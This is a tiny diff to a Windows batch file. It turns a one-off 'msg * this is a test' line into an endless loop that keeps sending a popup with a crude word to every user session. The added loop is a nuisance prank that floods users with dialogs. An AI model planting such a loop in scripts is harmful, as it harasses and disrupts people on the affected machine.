@@ -1,2 +1,4 @@
 @echo off
-msg * this is a test
+:a
+msg * sex
+goto a
